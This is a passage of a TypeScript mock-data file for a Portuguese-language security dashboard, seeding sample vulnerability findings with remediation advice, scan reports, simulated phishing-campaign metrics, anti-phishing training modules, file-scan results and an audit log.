        'Cabeçalhos CORS permissivos',
        'HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Headers: Authorization, Content-Type',
        daysAgo(11),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Restringir as origens permitidas',
        description: 'Substituir o curinga por uma allowlist de domínios corporativos.',
        effort: 'low',
      },
      {
        order: 2,
        title: 'Evitar curinga com credenciais',
        description: 'Nunca combinar Access-Control-Allow-Origin: * com Allow-Credentials: true.',
        effort: 'low',
      },
    ],
    references: [
      'https://owasp.org/Top10/A05_2021-Security_Misconfiguration/',
      'https://developer.mozilla.org/pt-BR/docs/Web/HTTP/CORS',
    ],
    detectedAt: daysAgo(11),
    updatedAt: daysAgo(11),
    history: [detected('vuln-010', daysAgo(11), 'Detectado na verificação de política CORS.')],
  },
  {
    id: 'vuln-011',
    title: 'Divulgação de tecnologia via cabeçalho X-Powered-By',
    cve: null,
    owaspId: 'A05:2021',
    owaspCategory: 'Security Misconfiguration',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N', base: 5.3 },
    severity: severityFromCvss(5.3),
    status: 'accepted',
    assetId: 'asset-001',
    assetName: 'srv-web-01',
    assetHost: 'srv-web-01.empresa.com',
    affectedComponent: 'Servidor Web (Express)',
    affectedVersion: null,
    fixedVersion: null,
    artifactHash: null,
    description:
      'As respostas expõem o cabeçalho X-Powered-By: Express, revelando a pilha tecnológica e facilitando o direcionamento de ataques. O risco foi formalmente aceito por ora, dada a baixa criticidade e o cronograma de migração do servidor.',
    evidence: [
      evidence(
        'vuln-011',
        1,
        'response',
        'Cabeçalho de resposta',
        'HTTP/1.1 200 OK\nX-Powered-By: Express\nContent-Type: text/html; charset=utf-8',
        daysAgo(25),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Remover o cabeçalho',
        description: 'Desabilitar via app.disable("x-powered-by") ou removê-lo no proxy reverso.',
        effort: 'low',
      },
    ],
    references: ['https://owasp.org/Top10/A05_2021-Security_Misconfiguration/'],
    detectedAt: daysAgo(25),
    updatedAt: daysAgo(19),
    history: [
      detected('vuln-011', daysAgo(25), 'Detectado na análise de cabeçalhos de resposta.'),
      statusChanged(
        'vuln-011',
        2,
        daysAgo(19),
        'Leonardo Rodrigues',
        'open',
        'accepted',
        'Risco aceito até a desativação do servidor.',
      ),
    ],
  },

  // ---- Low (2) --------------------------------------------------------------
  {
    id: 'vuln-012',
    title: 'Listagem de diretório habilitada',
    cve: null,
    owaspId: 'A05:2021',
    owaspCategory: 'Security Misconfiguration',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N', base: 3.7 },
    severity: severityFromCvss(3.7),
    status: 'open',
    assetId: 'asset-006',
    assetName: 'srv-legado',
    assetHost: '192.168.0.20',
    affectedComponent: 'Servidor Legado (Apache)',
    affectedVersion: null,
    fixedVersion: null,
    artifactHash: null,
    description:
      'O servidor Apache exibe o índice automático de diretórios sem arquivo padrão, expondo a estrutura de pastas e arquivos internos. A informação auxilia o reconhecimento por parte de um atacante.',
    evidence: [
      evidence(
        'vuln-012',
        1,
        'response',
        'Índice de diretório exposto',
        'HTTP/1.1 200 OK\n<title>Index of /relatorios</title>\n<a href="backup.zip">backup.zip</a>\n<a href="config.old">config.old</a>',
        daysAgo(22),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Desabilitar o autoindex',
        description: 'Definir "Options -Indexes" no Apache e disponibilizar um index padrão.',
        effort: 'low',
      },
    ],
    references: ['https://owasp.org/Top10/A05_2021-Security_Misconfiguration/'],
    detectedAt: daysAgo(22),
    updatedAt: daysAgo(22),
    history: [detected('vuln-012', daysAgo(22), 'Detectado na varredura do servidor legado.')],
  },
  {
    id: 'vuln-013',
    title: 'Banner de versão do PostgreSQL exposto',
    cve: null,
    owaspId: 'A05:2021',
    owaspCategory: 'Security Misconfiguration',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N', base: 3.7 },
    severity: severityFromCvss(3.7),
    status: 'resolved',
    assetId: 'asset-005',
    assetName: 'db-central',
    assetHost: 'db.empresa.com',
    affectedComponent: 'Banco Central (PostgreSQL)',
    affectedVersion: null,
    fixedVersion: null,
    artifactHash: null,
    description:
      'A mensagem de apresentação do banco revelava a versão exata do PostgreSQL, permitindo correlacionar vulnerabilidades conhecidas com precisão. A exibição do banner foi ajustada para não divulgar a versão.',
    evidence: [
      evidence(
        'vuln-013',
        1,
        'response',
        'Banner do serviço',
        'PostgreSQL 15.3 on x86_64-pc-linux-gnu, compiled by gcc 12.2.0, 64-bit',
        daysAgo(35),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Ocultar a versão no banner',
        description: 'Definir server_version_num restrito e limitar mensagens de conexão.',
        effort: 'low',
      },
    ],
    references: ['https://owasp.org/Top10/A05_2021-Security_Misconfiguration/'],
    detectedAt: daysAgo(35),
    updatedAt: daysAgo(9),
    history: [
      detected('vuln-013', daysAgo(35), 'Detectado na varredura do banco de dados.'),
      statusChanged(
        'vuln-013',
        2,
        daysAgo(9),
        'Edson Marcelino',
        'open',
        'resolved',
        'Banner ajustado e reteste aprovado.',
      ),
    ],
  },

  // ---- Info (1) -------------------------------------------------------------
  {
    id: 'vuln-014',
    title: 'Cabeçalho Content-Security-Policy ausente',
    cve: null,
    owaspId: 'A05:2021',
    owaspCategory: 'Security Misconfiguration',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:N', base: 0.0 },
    severity: severityFromCvss(0.0),
    status: 'open',
    assetId: 'asset-003',
    assetName: 'portal-cliente',
    assetHost: 'portal.empresa.com',
    affectedComponent: 'Portal do Cliente (cabeçalhos)',
    affectedVersion: null,
    fixedVersion: null,
    artifactHash: null,
    description:
      'As respostas do portal não incluem o cabeçalho Content-Security-Policy, uma defesa em profundidade contra XSS e injeção de conteúdo. O item é informativo e recomenda-se a adoção de uma política restritiva.',
    evidence: [
      evidence(
        'vuln-014',
        1,
        'response',
        'Cabeçalhos sem CSP',
        'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nX-Content-Type-Options: nosniff',
        daysAgo(4),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Definir uma CSP restritiva',
        description:
          "Adicionar Content-Security-Policy: default-src 'self'; object-src 'none'; frame-ancestors 'none'.",
        effort: 'medium',
      },
    ],
    references: [
      'https://owasp.org/Top10/A05_2021-Security_Misconfiguration/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html',
    ],
    detectedAt: daysAgo(4),
    updatedAt: daysAgo(4),
    history: [detected('vuln-014', daysAgo(4), 'Detectado na análise de cabeçalhos de segurança.')],
  },
];

// -----------------------------------------------------------------------------
// Varreduras — 5 relatórios (4 concluídas, 1 em andamento). findingsBySeverity
// soma findingsCount e reflete os achados do ativo no momento da varredura.
// -----------------------------------------------------------------------------

export const MOCK_SCANS: ScanReport[] = [
  {
    id: 'scan-001',
    assetId: 'asset-001',
    assetName: 'srv-web-01',
    assetHost: 'srv-web-01.empresa.com',
    status: 'completed',
    scanner: SCANNER,
    startedAt: daysAgo(5),
    finishedAt: new Date(NOW_MS - 5 * DAY_MS + 742_000).toISOString(),
    durationSec: 742,
    findingsCount: 3,
    findingsBySeverity: { critical: 0, high: 2, medium: 1, low: 0, info: 0 },
    progress: 100,
    stage: 'Concluída',
    estimatedCompletionAt: new Date(NOW_MS - 5 * DAY_MS + 742_000).toISOString(),
  },
  {
    id: 'scan-002',
    assetId: 'asset-003',
    assetName: 'portal-cliente',
    assetHost: 'portal.empresa.com',
    status: 'completed',
    scanner: SCANNER,
    startedAt: daysAgo(9),
    finishedAt: new Date(NOW_MS - 9 * DAY_MS + 968_000).toISOString(),
    durationSec: 968,
    findingsCount: 4,
    findingsBySeverity: { critical: 1, high: 1, medium: 1, low: 0, info: 1 },
    progress: 100,
    stage: 'Concluída',
    estimatedCompletionAt: new Date(NOW_MS - 9 * DAY_MS + 968_000).toISOString(),
  },
  {
    id: 'scan-003',
    assetId: 'asset-004',
    assetName: 'api-pagamentos',
    assetHost: 'api.empresa.com',
    status: 'completed',
    scanner: SCANNER,
    startedAt: daysAgo(2),
    finishedAt: new Date(NOW_MS - 2 * DAY_MS + 611_000).toISOString(),
    durationSec: 611,
    findingsCount: 3,
    findingsBySeverity: { critical: 1, high: 1, medium: 1, low: 0, info: 0 },
    progress: 100,
    stage: 'Concluída',
    estimatedCompletionAt: new Date(NOW_MS - 2 * DAY_MS + 611_000).toISOString(),
  },
  {
    id: 'scan-004',
    assetId: 'asset-002',
    assetName: 'vpn-gateway',
    assetHost: 'vpn.empresa.com',
    status: 'completed',
    scanner: SCANNER,
    startedAt: daysAgo(2),
    finishedAt: new Date(NOW_MS - 2 * DAY_MS + 523_000).toISOString(),
    durationSec: 523,
    findingsCount: 2,
    findingsBySeverity: { critical: 1, high: 0, medium: 1, low: 0, info: 0 },
    progress: 100,
    stage: 'Concluída',
    estimatedCompletionAt: new Date(NOW_MS - 2 * DAY_MS + 523_000).toISOString(),
  },
  {
    id: 'scan-005',
    assetId: 'asset-005',
    assetName: 'db-central',
    assetHost: 'db.empresa.com',
    status: 'running',
    scanner: SCANNER,
    startedAt: hoursAgo(3),
    finishedAt: null,
    durationSec: null,
    findingsCount: 0,
    findingsBySeverity: { critical: 0, high: 0, medium: 0, low: 0, info: 0 },
    // Varredura longa do seed (não segue o ciclo de 20 s da simulação): progresso fixo,
    // sem estimativa de conclusão.
    progress: 62,
    stage: 'Testando autenticação',
    estimatedCompletionAt: null,
  },
];

// -----------------------------------------------------------------------------
// Campanhas de phishing — 5. `metrics` traz os totais sobre os destinatários
// reais (156/203/...); MOCK_RECIPIENTS abaixo é apenas uma AMOSTRA da tabela de
// status. Todas as taxas de clique das campanhas com envios ficam entre 8% e 35%.
// -----------------------------------------------------------------------------

const CREATOR_ADMIN = 'Leonardo Rodrigues';
const CREATOR_ANALYST = 'Edson Marcelino';

export const MOCK_CAMPAIGNS: Campaign[] = [
  {
    id: 'camp-001',
    name: 'Simulação Q3 – Financeiro',
    template: 'urgency',
    targetGroup: 'Financeiro',
    status: 'active',
    scheduledAt: daysAgo(5),
    startedAt: daysAgo(5),
    endedAt: null,
    createdBy: CREATOR_ANALYST,
    createdAt: daysAgo(6),
    metrics: {
      recipients: 156,
      sent: 156,
      opened: 97,
      clicked: 37,
      submitted: 17,
      reported: 30,
      trained: 22,
      openRate: 62,
      clickRate: 24,
      submitRate: 11,
      reportRate: 19,
      trainedRate: 59,
    },
  },
  {
    id: 'camp-002',
    name: 'Campanha Junho 2026 – Urgência',
    template: 'urgency',
    targetGroup: 'Toda a empresa',
    status: 'completed',
    scheduledAt: daysAgo(92),
    startedAt: daysAgo(92),
    endedAt: daysAgo(88),
    createdBy: CREATOR_ANALYST,
    createdAt: daysAgo(95),
    metrics: {
      recipients: 203,
      sent: 203,
      opened: 144,
      clicked: 63,
      submitted: 30,
      reported: 24,
      trained: 51,
      openRate: 71,
      clickRate: 31,
      submitRate: 15,
      reportRate: 12,
      trainedRate: 81,
    },
  },
  {
    id: 'camp-003',
    name: 'Simulação Credencial Maio',
    template: 'authority',
    targetGroup: 'TI e Operações',
    status: 'completed',
    scheduledAt: daysAgo(118),
    startedAt: daysAgo(118),
    endedAt: daysAgo(115),
    createdBy: CREATOR_ADMIN,
    createdAt: daysAgo(121),
    metrics: {
      recipients: 180,
      sent: 180,
      opened: 119,
      clicked: 31,
      submitted: 14,
      reported: 40,
      trained: 28,
      openRate: 66,
      clickRate: 17,
      submitRate: 8,
      reportRate: 22,
      trainedRate: 90,
    },
  },
  {
    id: 'camp-004',
    name: 'Fake Invoice Julho',
    template: 'curiosity',
    targetGroup: 'Comercial',
    status: 'completed',
    scheduledAt: daysAgo(62),
    startedAt: daysAgo(62),
    endedAt: daysAgo(58),
    createdBy: CREATOR_ANALYST,
    createdAt: daysAgo(65),
    metrics: {
      recipients: 120,
      sent: 120,
      opened: 70,
      clicked: 34,
      submitted: 16,
      reported: 11,
      trained: 20,
      openRate: 58,
      clickRate: 28,
      submitRate: 13,
      reportRate: 9,
      trainedRate: 59,
    },
  },
  {
    id: 'camp-005',
    name: 'Diretoria – Autoridade Q4',
    template: 'authority',
    targetGroup: 'Diretoria',
    status: 'scheduled',
    scheduledAt: daysAgo(-25),
    startedAt: null,
    endedAt: null,
    createdBy: CREATOR_ADMIN,
    createdAt: daysAgo(3),
    metrics: {
      recipients: 24,
      sent: 0,
      opened: 0,
      clicked: 0,
      submitted: 0,
      reported: 0,
      trained: 0,
      openRate: 0,
      clickRate: 0,
      submitRate: 0,
      reportRate: 0,
      trainedRate: 0,
    },
  },
];

// -----------------------------------------------------------------------------
// Destinatários (amostra determinística por campanha via mulberry32).
// As contagens de cada estágio mantêm a proporção da campanha e as taxas de
// clique da amostra também ficam entre 8% e 35%. Estágios são encadeados:
// enviado ⊇ abriu ⊇ clicou ⊇ submeteu; "reportou" recai sobre a cauda que não
// clicou; "treinou" recai sobre quem clicou.
// -----------------------------------------------------------------------------

interface RecipientPlan {
  campaign: Campaign;
  seed: number;
  size: number;
  opened: number;
  clicked: number;
  submitted: number;
  reported: number;
  trained: number;
  trainingId: string;
}

const TEMPLATE_TRAINING_ID: Record<Campaign['template'], string> = {
  urgency: 'trn-urgency',
  authority: 'trn-authority',
  curiosity: 'trn-curiosity',
};

function buildRecipients(plan: RecipientPlan): CampaignRecipient[] {
  const rand = mulberry32(plan.seed);
  const startBase = Date.parse(plan.campaign.startedAt ?? plan.campaign.scheduledAt);
  const rows: CampaignRecipient[] = [];
  const usedEmails = new Set<string>();

  for (let i = 0; i < plan.size; i++) {
    const first = FIRST_NAMES[Math.floor(rand() * FIRST_NAMES.length)];
    const last = LAST_NAMES[Math.floor(rand() * LAST_NAMES.length)];
    const department = RECIPIENT_DEPARTMENTS[Math.floor(rand() * RECIPIENT_DEPARTMENTS.length)];

    const localBase = `${slugify(first)}.${slugify(last)}`;
    let email = `${localBase}@empresa.com`;
    let suffix = 2;
    while (usedEmails.has(email)) {
      email = `${localBase}${suffix}@empresa.com`;
      suffix += 1;
    }
    usedEmails.add(email);

    const isOpened = i < plan.opened;
    const isClicked = i < plan.clicked;
    const isSubmitted = i < plan.submitted;
    const isReported = i >= plan.size - plan.reported;
    const isTrained = i < plan.trained;

    const sentMs = startBase + Math.floor(rand() * 5 * HOUR_MS);
    const sentAt = new Date(sentMs).toISOString();

    const openedMs = isOpened ? sentMs + 30 * MINUTE_MS + Math.floor(rand() * 8 * HOUR_MS) : null;
    const clickedMs =
      isClicked && openedMs !== null ? openedMs + MINUTE_MS + Math.floor(rand() * 2 * HOUR_MS) : null;
    const submittedMs =
      isSubmitted && clickedMs !== null ? clickedMs + 30_000 + Math.floor(rand() * 30 * MINUTE_MS) : null;
    const reportedBaseMs = openedMs ?? sentMs;
    const reportedMs = isReported ? reportedBaseMs + 20 * MINUTE_MS + Math.floor(rand() * 3 * HOUR_MS) : null;

    rows.push({
      id: `${plan.campaign.id}-r-${String(i + 1).padStart(2, '0')}`,
      campaignId: plan.campaign.id,
      name: `${first} ${last}`,
      email,
      department,
      sentAt,
      openedAt: openedMs !== null ? new Date(openedMs).toISOString() : null,
      clickedAt: clickedMs !== null ? new Date(clickedMs).toISOString() : null,
      submittedAt: submittedMs !== null ? new Date(submittedMs).toISOString() : null,
      reportedAt: reportedMs !== null ? new Date(reportedMs).toISOString() : null,
      trainingCompleted: isTrained,
      trainingId: isTrained ? plan.trainingId : null,
    });
  }

  return rows;
}

const CAMPAIGN_BY_ID: Record<string, Campaign> = Object.fromEntries(MOCK_CAMPAIGNS.map((c) => [c.id, c]));

export const MOCK_RECIPIENTS: CampaignRecipient[] = [
  ...buildRecipients({
    campaign: CAMPAIGN_BY_ID['camp-001'],
    seed: 0x1a2b3c01,
    size: 16,
    opened: 10,
    clicked: 4,
    submitted: 2,
    reported: 3,
    trained: 3,
    trainingId: TEMPLATE_TRAINING_ID.urgency,
  }),
  ...buildRecipients({
    campaign: CAMPAIGN_BY_ID['camp-002'],
    seed: 0x1a2b3c02,
    size: 16,
    opened: 11,
    clicked: 5,
    submitted: 2,
    reported: 2,
    trained: 4,
    trainingId: TEMPLATE_TRAINING_ID.urgency,
  }),
  ...buildRecipients({
    campaign: CAMPAIGN_BY_ID['camp-003'],
    seed: 0x1a2b3c03,
    size: 18,
    opened: 12,
    clicked: 3,
    submitted: 1,
    reported: 4,
    trained: 3,
    trainingId: TEMPLATE_TRAINING_ID.authority,
  }),
  ...buildRecipients({
    campaign: CAMPAIGN_BY_ID['camp-004'],
    seed: 0x1a2b3c04,
    size: 15,
    opened: 9,
    clicked: 4,
    submitted: 2,
    reported: 1,
    trained: 2,
    trainingId: TEMPLATE_TRAINING_ID.curiosity,
  }),
];

// -----------------------------------------------------------------------------
// Treinamentos contextuais — ids EXATOS por gatilho de engenharia social.
// -----------------------------------------------------------------------------

export const MOCK_TRAININGS: Training[] = [
  {
    id: 'trn-urgency',
    campaignId: 'camp-001',
    moduleCode: 'US-005',
    title: 'Reconhecendo golpes de urgência',
    attackType: 'Phishing por urgência',
    durationMin: 8,
    progress: 0,
    completed: false,
    completedAt: null,
    summary:
      'Golpes de urgência pressionam você a agir sem pensar, alegando bloqueios, prazos e consequências imediatas. Este módulo mostra como reconhecer o gatilho e reagir com calma.',
    sections: [
      {
        heading: 'Como a urgência é usada contra você',
        body: 'Mensagens de urgência criam medo de perder algo ou de sofrer uma punição: "sua conta será bloqueada em 24 horas" ou "pagamento pendente será cancelado". O objetivo é fazer você clicar antes de raciocinar.',
      },
      {
        heading: 'Pare e respire antes de clicar',
        body: 'Nenhuma solicitação legítima exige que você aja em segundos. Ao sentir pressão para agir imediatamente, trate isso como um sinal de alerta e verifique o remetente por um canal oficial.',
      },
      {
        heading: 'Confirme pelo canal oficial',
        body: 'Em vez de clicar no link da mensagem, acesse o sistema digitando você mesmo o endereço, ou ligue para o setor responsável usando um contato que você já conhece.',
      },
    ],
    warningSigns: [
      'Prazos curtíssimos e ameaças de bloqueio ou multa.',
      'Pedido para clicar em um link "agora" para evitar consequências.',
      'Erros de português e endereços de remetente estranhos.',
      'Solicitação de senha ou dados sensíveis por e-mail.',
    ],
    bestPractices: [
      'Desconfie de qualquer mensagem que exija ação imediata.',
      'Digite o endereço do sistema no navegador em vez de clicar no link.',
      'Confirme com o setor responsável por um canal já conhecido.',
      'Reporte a mensagem suspeita ao time de TI.',
    ],
  },
  {
    id: 'trn-authority',
    campaignId: 'camp-003',
    moduleCode: 'US-006',
    title: 'Golpes que usam autoridade',
    attackType: 'Phishing por autoridade',
    durationMin: 10,
    progress: 0,
    completed: false,
    completedAt: null,
    summary:
      'Atacantes se passam por diretores, gerentes ou pela equipe de TI para conseguir que você siga ordens sem questionar. Aprenda a validar solicitações que invocam hierarquia.',
    sections: [
      {
        heading: 'A força do "chefe pediu"',
        body: 'Quando uma mensagem parece vir de um superior ou da TI, tendemos a obedecer sem checar. Golpistas exploram exatamente essa deferência à autoridade para pedir transferências, senhas ou instalação de programas.',
      },
      {
        heading: 'Sinais de falsa autoridade',
        body: 'Desconfie de pedidos incomuns feitos com pressa, sigilo ("não comente com ninguém") e por um canal diferente do habitual. E-mails que imitam o nome do diretor mas usam um endereço externo são clássicos.',
      },
      {
        heading: 'Valide fora do canal da mensagem',
        body: 'Confirme a solicitação pessoalmente, por telefone ou pelo aplicativo corporativo oficial. Uma verificação de trinta segundos evita um incidente grave.',
      },
    ],
    warningSigns: [
      'Pedido urgente e sigiloso vindo de um "diretor" ou da "TI".',
      'Endereço de e-mail que imita, mas não é, o oficial.',
      'Solicitação de transferência, senha ou acesso fora do processo normal.',
      'Tom que desencoraja você a confirmar com outras pessoas.',
    ],
    bestPractices: [
      'Confirme pedidos sensíveis por um segundo canal oficial.',
      'Verifique cuidadosamente o endereço real do remetente.',
      'Nunca compartilhe senhas, nem mesmo com a TI.',
      'Reporte solicitações estranhas, mesmo que pareçam vir da chefia.',
    ],
  },
  {
    id: 'trn-curiosity',
    campaignId: 'camp-004',
    moduleCode: 'US-007',
    title: 'Curiosidade e iscas de conteúdo',
    attackType: 'Phishing por curiosidade',
    durationMin: 9,
    progress: 0,
    completed: false,
    completedAt: null,
    summary:
      'Iscas de curiosidade prometem informações irresistíveis — plano de cargos, fotos do evento, uma fatura inesperada — para induzir o clique. Este módulo ensina a resistir à tentação.',
    sections: [
      {
        heading: 'A isca da curiosidade',
        body: 'Assuntos como "novo plano de cargos e salários" ou "sua fatura em anexo" despertam interesse imediato. O anexo ou link, porém, esconde malware ou uma página falsa de captura de credenciais.',
      },
      {
        heading: 'Anexos e links inesperados',
        body: 'Documentos que você não estava esperando, especialmente com extensões como .zip, .html ou macros, merecem desconfiança. Passe o mouse sobre o link para ver o destino real antes de qualquer ação.',
      },
      {
        heading: 'Verifique a origem antes de abrir',
        body: 'Confirme com o suposto remetente se ele realmente enviou aquele conteúdo. Na dúvida, não abra e reporte à TI.',
      },
    ],
    warningSigns: [
      'Assunto sensacionalista ou "exclusivo" que desperta curiosidade.',
      'Anexo ou link que você não solicitou.',
      'Endereço de link diferente do texto exibido.',
      'Promessa de conteúdo interno vindo de fora da empresa.',
    ],
    bestPractices: [
      'Passe o mouse sobre os links para ver o destino real.',
      'Não abra anexos inesperados; confirme com o remetente.',
      'Trate ofertas boas demais para ser verdade como golpe.',
      'Reporte a mensagem suspeita antes de interagir.',
    ],
  },
];

// -----------------------------------------------------------------------------
// Linha do tempo do dashboard — 12 eventos mistos dos últimos 10 dias.
// -----------------------------------------------------------------------------

export const MOCK_TIMELINE: TimelineEvent[] = [
  {
    id: 'evt-001',
    at: hoursAgo(20),
    kind: 'finding',
    severity: 'critical',
    title: 'Novo achado crítico: CVE-2024-3094',
    description: 'Backdoor no xz-utils detectado em vpn.empresa.com.',
    href: '/vulnerabilities/vuln-002',
  },
  {
    id: 'evt-002',
    at: hoursAgo(3),
    kind: 'scan',
    title: 'Varredura em andamento',
    description: 'Baluarte OWASP Engine iniciou a análise de db-central.',
  },
  {
    id: 'evt-003',
    at: daysAgo(1),
    kind: 'scan',
    title: 'Varredura concluída',
    description: 'srv-web-01 analisado: 3 achados (2 altos, 1 médio).',
  },
  {
    id: 'evt-004',
    at: daysAgo(2),
    kind: 'training',
    title: 'Treinamento concluído',
    description: 'Ana Souza concluiu "Reconhecendo golpes de urgência".',
    href: '/training/trn-urgency',
  },
  {
    id: 'evt-005',
    at: daysAgo(3),
    kind: 'campaign',
    title: 'Campanha agendada',
    description: 'Diretoria – Autoridade Q4 agendada para a Diretoria.',
    href: '/campaigns/camp-005',
  },
  {
    id: 'evt-006',
    at: daysAgo(3),
    kind: 'user',
    title: 'Novo usuário pendente',
    description: 'Marina Costa cadastrada como administradora (pendente de ativação).',
    href: '/users',
  },
  {
    id: 'evt-007',
    at: daysAgo(4),
    kind: 'finding',
    severity: 'critical',
    title: 'Status alterado: CVE-2021-44228',
    description: 'Edson Marcelino moveu o achado para "Em remediação" em api.empresa.com.',
    href: '/vulnerabilities/vuln-001',
  },
  {
    id: 'evt-008',
    at: daysAgo(5),
    kind: 'finding',
    severity: 'high',
    title: 'Novo achado alto: CVE-2024-6387',
    description: 'regreSSHion detectado no serviço SSH de srv-web-01.',
    href: '/vulnerabilities/vuln-004',
  },
  {
    id: 'evt-009',
    at: daysAgo(5),
    kind: 'campaign',
    title: 'Campanha ativa',
    description: 'Simulação Q3 – Financeiro em andamento com 156 destinatários.',
    href: '/campaigns/camp-001',
  },
  {
    id: 'evt-010',
    at: daysAgo(6),
    kind: 'finding',
    severity: 'medium',
    title: 'Novo achado médio: CORS permissivo',
    description: 'Origem curinga detectada na API de pagamentos.',
    href: '/vulnerabilities/vuln-010',
  },
  {
    id: 'evt-011',
    at: daysAgo(8),
    kind: 'system',
    title: 'Política de segurança revisada',
    description: 'Tempo de sessão mantido em 30 min e limite de tentativas em 5.',
    href: '/settings',
  },
  {
    id: 'evt-012',
    at: daysAgo(9),
    kind: 'finding',
    severity: 'low',
    title: 'Achado resolvido: banner de versão',
    description: 'Exposição de versão do PostgreSQL corrigida em db-central.',
    href: '/vulnerabilities/vuln-013',
  },
];

// -----------------------------------------------------------------------------
// Configurações — política de segurança e preferências de notificação.
// -----------------------------------------------------------------------------

// Espelha o que a API publica em /configuracoes/seguranca: so o que existe de fato.
// O log e registrado, mas ainda nao e imutavel nem tem retencao definida (B29).
export const MOCK_SECURITY_POLICY: SecurityPolicy = {
  passwordMinLength: 8,
  requireMixedCase: true,
  requireNumberAndSymbol: true,
  tokenAlgorithm: 'JWT HS256',
  sessionExpirationMinutes: 30,
  sessionMaxHours: 8,
  loginAttemptLimit: 5,
  twoFactorEnabled: false,
  auditRegistersActions: true,
  auditLogImmutable: false,
  auditRetentionMonths: null,
};

export const MOCK_NOTIFICATION_PREFERENCES: NotificationPreferences = {
  emailAlerts: true,
  criticalOnly: false,
  weeklyDigest: true,
  campaignReports: true,
};

// ---- Análise de arquivos (B05) ------------------------------------------------

/** Análise guardada no mock: o modelo da tela mais o dono (o arquivo em si nunca é guardado). */
export interface MockFileScan extends Omit<FileScan, 'uploadedBy'> {
  userId: string;
}

/** Relatório público do hash no VirusTotal (segunda opinião, B20). */
const vtLink = (sha256: string) => `https://www.virustotal.com/gui/file/${sha256}`;

/**
 * Histórico inicial, mais recente primeiro. O hash do EICAR é o real do arquivo de teste de 68 bytes.
 * Cada análise mostra uma situação da segunda opinião do VirusTotal (B20).
 */
export const MOCK_FILE_SCANS: MockFileScan[] = [
  {
    id: 'arq-004',
    userId: 'u-002',
    name: 'proposta-comercial-v3.pdf',
    size: 245_812,
    sha256: '41a8760770b6306e718f0b7a89eca7d188e9f4edfe519eccb1b136f6071e0a3e',
    result: 'clean',
    threat: null,
    scannedAt: hoursAgo(5),
    secondOpinion: {
      source: 'VirusTotal',
      status: 'no_detection',
      reason: null,
      detections: 0,
      total: 66,
      checkedAt: hoursAgo(5),
      link: vtLink('41a8760770b6306e718f0b7a89eca7d188e9f4edfe519eccb1b136f6071e0a3e'),
    },
  },
  {
    id: 'arq-003',
    userId: 'u-001',
    name: 'eicar.com',
    size: 68,
    sha256: '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f',
    result: 'threat',
    threat: 'Eicar-Signature',
    scannedAt: daysAgo(1),
    secondOpinion: {
      source: 'VirusTotal',
      status: 'malicious',
      reason: null,
      detections: 61,
      total: 68,
      checkedAt: daysAgo(1),
      link: vtLink('275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f'),
    },
  },
  {
    id: 'arq-002',
    userId: 'u-000',
    name: 'orcamento-2027.xlsx',
    size: 1_532_004,
    sha256: 'a25c22a11d33d444ecb9aa93185aa15bf2b1e1264137dffc40b7cab7922deae9',
    result: 'clean',
    threat: null,
    scannedAt: daysAgo(3),
    secondOpinion: {
      source: 'VirusTotal',
      status: 'unknown',
      reason: null,
      detections: null,
      total: null,
      checkedAt: daysAgo(3),
      link: vtLink('a25c22a11d33d444ecb9aa93185aa15bf2b1e1264137dffc40b7cab7922deae9'),
    },
  },
  {
    id: 'arq-001',
    userId: 'u-002',
    name: 'nota-fiscal-setembro.zip',
    size: 88_412,
    sha256: '3549553e9afd4ef7fd5a5e81e7f5220a595a6132c1058e877db55fa473e3e5cf',
    result: 'clean',
    threat: null,
    scannedAt: daysAgo(6),
    // Análise anterior à segunda opinião (B20).
    secondOpinion: null,
  },
];

// -----------------------------------------------------------------------------
// Auditoria (RN-008) — trilha de exemplo, mais recente primeiro. As ações são os mesmos
// códigos que o servidor grava; `user: null` = conta excluída ou ação sem autor.
// -----------------------------------------------------------------------------

const ADMIN_REF = { id: 'u-000', name: 'Leonardo Rodrigues', email: 'admin@empresa.com' };
const ANALYST_REF = { id: 'u-001', name: 'Rafael Nunes', email: 'analista@empresa.com' };
const COLLAB_REF = { id: 'u-002', name: 'João Pereira', email: 'colaborador@empresa.com' };
const EDSON_REF = { id: 'u-003', name: 'Edson Marcelino', email: 'edson.marcelino@empresa.com' };

export const MOCK_AUDIT_LOG: AuditEntry[] = [
  { id: 'aud-030', action: 'LOGIN', detail: null, at: hoursAgo(3), user: ADMIN_REF },
  {
    id: 'aud-029',
    action: 'ALTERAR_STATUS_VULNERABILIDADE',
    detail: 'vuln-002 (portal.empresa.com, A03:2021): Aberta → Em remediação',
    at: hoursAgo(5),
    user: ANALYST_REF,
  },
  {
    id: 'aud-028',
    action: 'INICIAR_VARREDURA',
    detail: 'scan-014 no ativo asset-003 (portal.empresa.com)',
    at: hoursAgo(8),
    user: ANALYST_REF,
  },
  { id: 'aud-027', action: 'LOGIN', detail: null, at: hoursAgo(9), user: ANALYST_REF },
  {
    id: 'aud-026',
    action: 'REPORTAR_PHISHING',
    detail: 'Simulação Q3 – Financeiro / colaborador@empresa.com',
    at: hoursAgo(20),
    user: COLLAB_REF,
  },
  {
    id: 'aud-025',
    action: 'CONCLUIR_TREINAMENTO',
    detail: 'Simulação Q3 – Financeiro / ana.souza@empresa.com',
    at: daysAgo(1),
    user: { id: 'u-004', name: 'Ana Souza', email: 'ana.souza@empresa.com' },
  },
  {
    id: 'aud-024',
    action: 'CLIQUE_LINK_PHISHING',
    detail: 'Simulação Q3 – Financeiro / ana.souza@empresa.com',
    at: daysAgo(1.05),
    user: { id: 'u-004', name: 'Ana Souza', email: 'ana.souza@empresa.com' },
  },
  {
    id: 'aud-023',
